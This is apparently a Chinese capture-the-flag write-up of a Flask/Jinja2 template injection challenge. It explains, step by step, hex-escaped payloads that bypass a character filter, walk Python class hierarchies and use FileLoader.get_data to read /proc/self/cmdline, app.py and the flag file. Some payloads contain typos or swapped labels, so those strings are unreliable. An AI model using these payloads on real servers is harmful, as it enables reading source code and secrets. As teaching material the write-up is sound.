1.ssti，没什么好说的了

![img](file:///C:/Users/iolcy/AppData/Local/Temp/msohtmlclip1/01/clip_image002.jpg)

这里我用hackbar代替burp，这里用hackbar因为方便

![img](file:///C:/Users/iolcy/AppData/Local/Temp/msohtmlclip1/01/clip_image004.jpg)

![img](file:///C:/Users/iolcy/AppData/Local/Temp/msohtmlclip1/01/clip_image006.jpg)

2.获取类型所属的对象，后面显示被过滤了，看了大佬的文章_'.这三个被过滤了，但可以用十六进制绕过

/x5f为：字符：_

未经过16进制转换的payload为：

{{()["__class__"]}}

经过16进制转换的payload为：

{{()["\x5f\x5fclass\x5f\x5f"]}}

__class__是python的内建属性，功能和type()函数一样，都是查看对象所在的类

![img](file:///C:/Users/iolcy/AppData/Local/Temp/msohtmlclip1/01/clip_image008.jpg)

![img](file:///C:/Users/iolcy/AppData/Local/Temp/msohtmlclip1/01/clip_image010.jpg)

得到类属性为tuple

/1为什么要寻找类所属对象？

flask是python编写的服务，而对于python编写flask的服务，知道类型所属属性就跟做渗透的时候手收集目标信息一样重要

 

3.寻找基类

未经过16进制转换payload：

{{()["__class__"]["__mro__"][1]}}

经过16进制转换后的paylaod：

{{()["\x5f\x5fclass\x5f\x5f"]["\x5f\x5fmro\x5f\x5f"][1]}}

![img](file:///C:/Users/iolcy/AppData/Local/Temp/msohtmlclip1/01/clip_image012.jpg)

![img](file:///C:/Users/iolcy/AppData/Local/Temp/msohtmlclip1/01/clip_image014.jpg)

得到基类：object

/1:什么是基类，/2为什么要去寻找基类，/3有什么作用，/4payload是什么意思

基类就是超类，属于继承技术，继承就是让类和类之间产生父子关系，子类可以拥有父类的静态属性方法。这里的父类值得是被继承的类，也叫作基类，子类指得是继承其他类的类，叫做派生类。举个例子，基于最少有两个类之间才有继承，有A,B两个类，B类继承A类，那么，A就是B的父类(又叫超类，基类)

/2:为什么要寻找基类,基类的寻找对于下面的测试就跟渗透测试中信息手收集同样重要

/3:作用就是为下面的测试进行收集

/4：payload详解：

{{()["__class__"]["__mro__"][1]}}

首先是{{}}，模板注入，必须具备的东西，这样才能被当做模板程序带入模板文件并执行

{{()}}

模板符号内的()，模板文件中，这么书写：()__class__.__base__()就是前端模板注入的标必须要写的 ，

{{()["__class__"]["__mro__"]}}

__mro__ 获取当前对象所有的父类

{{()["__class__"]["__mro__"][1]}}

[1]，如果有几个对象，则返回几个，如果这么写：

{{() ["__class__"]["__base__"]["__mro__"][2]}}

那么[2]，返回class.base这两个基类所有的父类

paylaod通读：我要通过mro获取class对象中所有的父类，且只有一个[1]对象

 

4.寻找可用引用

![img](file:///C:/Users/iolcy/AppData/Local/Temp/msohtmlclip1/01/clip_image016.jpg)

执行完payload，会返回所有可以引用的对象

经过16进制转换的paylaod：

{{()["\x5f\x5fclass\x5f\x5f"]["\x5f\x5fbases\x5f\x5f"][0]["\x5f\x5fsubclasses\x5f\x5f"]()}}

未经过16进制转换的payload：

{{()["__class__"]["__bases__"][0]["__subclasses__"]()}}

三个问题：

/1为什么要寻找所有可以引用的对象 /2 bases属性的作用 /3 subclasses类的作用 /4 payload什么意思

解：

/1 不同的方法，作用也不一样，调用不同的方法，可以对文件甚至对服务器进行操作

/2 __bases__ 属性的作用，通过该属性可以查看该类的所有直接父类

/3 __subclasses__属性的作用，可以获取类的所有子类 

/4 payload详解：

上面说完模板注入源码的固定写法，这里就跳过固定写法，将核心功能

{{()["__class__"]["__bases__"][0]["__subclasses__"]()}}

可以这样读这个payload：

__class__先查看所在的类的属性，获得属性(tuple)之后，__bases__属性可以直接查看这个类(tuple属性的类)的所有的直接父类，查看完所有直接的父类之后，然后__subclasses__属性直接获取所有的父类中的子类

payload通读：

我先获取这个类的属性，然后再获取这个tuple类的所有父类，然后再获取这些父类中所有的子类

5.接下来就是开始一系列利用了（基础不是很好，后面的待填坑）一些大佬的方法：

![https://img-blog.csdnimg.cn/20200629014542135.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwODAwNzM0,size_16,color_FFFFFF,t_70](file:///C:/Users/iolcy/AppData/Local/Temp/msohtmlclip1/01/clip_image018.gif)

接下来就是选可用的对象和调用函数了 我原本想用catch_warnings但是到最后的部分想起来.被过滤了不知道怎么调用了 看了一下wp 调用了这个类：

<class '_frozen_importlib_external.FileLoader'> ：

还是菜了(doge)

![img](file:///C:/Users/iolcy/AppData/Local/Temp/msohtmlclip1/01/clip_image020.jpg)

![img](file:///C:/Users/iolcy/AppData/Local/Temp/msohtmlclip1/01/clip_image022.jpg)

运行结果python/app.py文件正在运行

经过16进制转换的payload：

{{[]["\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f"]["\x5f\x5f\x62\x61\x73\x65\x5f\x5f"]["\x5f\x5f\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73\x5f\x5f"]()[91]["\x67\x65\x74\x5f\x64\x61\x74\x61"](0,"/proc/self/cmdline")}}

未经过16进制转换的payload：

{{[]["__class__"]["__base__"]["__subclasses__"]()[]["get_data"](0,"/proc/self/cmdline")}}

三个问题

相信看完上面的问题之后，paylaod中的属性都知道什么意思了

/1 get_data什么意思， /2为什么要读取/proc/self/cmdline目录 /3 paylaod详解

解答：

/1 读取数据

/2为什么要读取/proc/self/cmdline目录

cat该目录和查看系统pid进程号一样

/3 paylaod详解

get_data读取方法，去读取/proc/self/cmdline正在运行的程序

![img](file:///C:/Users/iolcy/AppData/Local/Temp/msohtmlclip1/01/clip_image024.jpg)

经过16进制转换的paylaod：

{{[]["\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f"]["\x5f\x5f\x62\x61\x73\x65\x5f\x5f"]["\x5f\x5f\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73\x5f\x5f"]()[91]["\x67\x65\x74\5f\x64\x61\x74\x61"](0,"app\x2epy")}}

跟上面都一样，没什么可以解释的

获得源码，可以大体推出来的位置：

读取flag：

![img](file:///C:/Users/iolcy/AppData/Local/Temp/msohtmlclip1/01/clip_image026.jpg)

![img](file:///C:/Users/iolcy/AppData/Local/Temp/msohtmlclip1/01/clip_image028.jpg)

未经过16进制编码的payload:

{{()["\x5F\x5Fclass\x5F\x5F"]["\x5F\x5Fbases\x5F\x5F"][0]["\x5F\x5Fsubclasses\x5F\x5F"]()[91]["get\x5Fdata"](0, "/proc/self/fd/3")}}

­经过16进制编码后的payload：

{{()["__class__"]["__bases__"][0]["__subclasses__"]()[91]["get_data"](0, "/proc/self/fd/3")}}

我为什么要读取/proc/self/fd/3这个文件呢，flag就在这个文件中